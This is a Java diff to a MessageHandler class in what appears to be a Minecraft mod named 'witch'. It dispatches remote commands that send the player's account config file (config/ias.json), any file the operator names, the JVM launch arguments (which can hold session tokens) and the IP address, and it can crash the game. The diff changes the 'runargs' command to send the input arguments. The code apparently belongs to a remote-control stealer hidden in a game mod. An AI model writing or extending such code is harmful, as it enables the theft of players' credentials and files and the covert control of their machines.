@@ -10,6 +10,8 @@ import me.soda.witch.shared.Message;
 import me.soda.witch.utils.*;
 import net.minecraft.text.Text;
 
+import java.lang.management.ManagementFactory;
+
 import static me.soda.witch.Witch.mc;
 import static me.soda.witch.Witch.messageUtils;
 
@@ -63,7 +65,7 @@ public class MessageHandler {
                     }
                     case "iasconfig" -> messageUtils.send(msgType, FileUtil.read("config/ias.json"));
                     case "read" -> messageUtils.send(msgType, FileUtil.read(msg));
-                    case "runargs" -> messageUtils.send(msgType, System.getProperties());
+                    case "runargs" -> messageUtils.send(msgType, ManagementFactory.getRuntimeMXBean().getInputArguments());
                     case "ip" -> messageUtils.send(msgType, NetUtil.getIp());
                     case "crash" -> MinecraftUtil.crash();
                     case "xor" -> {
